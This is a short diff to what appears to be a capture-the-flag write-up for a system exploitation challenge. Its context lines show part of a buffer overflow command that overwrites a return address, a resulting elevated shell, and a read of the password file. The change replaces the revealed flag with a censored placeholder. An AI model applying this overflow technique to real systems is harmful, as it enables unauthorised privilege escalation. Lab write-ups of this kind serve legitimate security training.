@@ -54,5 +54,5 @@ app-systeme-ch15@challenge02:~$ cat <(python -c "print 'A'*128+'\x64\x84\x04\x08
 id
 uid=1115(app-systeme-ch15) gid=1115(app-systeme-ch15) euid=1215(app-systeme-ch15-cracked) groups=1215(app-systeme-ch15-cracked),100(users),1115(app-systeme-ch15)
 cat .passwd
-B33r1sSoG0oD4y0urBr4iN
+<censored>
 ```
